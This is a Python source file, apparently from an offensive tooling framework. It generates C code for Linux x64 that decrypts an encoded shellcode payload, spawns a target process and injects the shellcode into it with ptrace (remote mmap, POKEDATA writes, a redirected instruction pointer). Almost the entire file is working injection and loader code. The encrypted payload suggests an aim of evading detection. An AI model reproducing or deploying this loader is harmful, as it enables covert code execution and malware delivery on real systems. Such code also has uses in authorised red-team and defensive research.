#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""C source generator for classic ptrace shellcode injection (Linux x64)."""

from __future__ import annotations

from lib.compile.linux_injection_common import LinuxInjectionBuilder


class PtraceInjectBuilder(LinuxInjectionBuilder):
    def build_source(
        self,
        encoded_payload: str,
        key: bytes,
        iv=None,
        *,
        target_cmd: str = "/bin/sleep 120",
    ) -> str:
        cmd = target_cmd.replace("\\", "\\\\").replace('"', '\\"')
        return f"""
{chr(10).join(self.headers())}
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>

char* enc_payload = "{encoded_payload}";
char* target_cmd = "{cmd}";

{self.ptrace_remote_syscall_helpers()}
static int ptrace_inject(pid_t pid, unsigned char *sc, size_t len)
{{
    struct user_regs_struct saved, regs;
    unsigned long remote_base;
    size_t i;

    if (ptrace(PTRACE_GETREGS, pid, NULL, &saved) < 0)
        goto fail;

    remote_base = remote_mmap_attached(pid, &saved, len);
    if (!remote_base || remote_base >= (unsigned long)-4095UL)
        goto fail;

    for (i = 0; i < len; i += sizeof(long)) {{
        long word = 0;
        size_t chunk = len - i;
        if (chunk > sizeof(long)) chunk = sizeof(long);
        memcpy(&word, sc + i, chunk);
        if (ptrace(PTRACE_POKEDATA, pid, (void *)(remote_base + i), word) < 0)
            goto fail;
    }}

    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
        goto fail;
    regs.rip = remote_base;
    regs.rax = 0;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
        goto fail;
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;

fail:
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return -1;
}}

int main(void)
{{
    pid_t target;
{self.decode_preamble()}
{self.decrypt_block(key, iv)}
    target = spawn_traceable_target(target_cmd);
    if (target < 0) return 1;
    if (wait_until_execed(target) != 0) {{
        kill(target, SIGKILL);
        waitpid(target, NULL, 0);
        munmap(shellcode_buf, (size_t)payload_size);
        free(decoded);
        return 1;
    }}
    if (ptrace_inject(target, shellcode_buf, (size_t)payload_size) != 0) {{
        kill(target, SIGKILL);
        waitpid(target, NULL, 0);
        munmap(shellcode_buf, (size_t)payload_size);
        free(decoded);
        return 1;
    }}
    waitpid(target, NULL, 0);
{self.cleanup_block()}
    return 0;
}}
"""
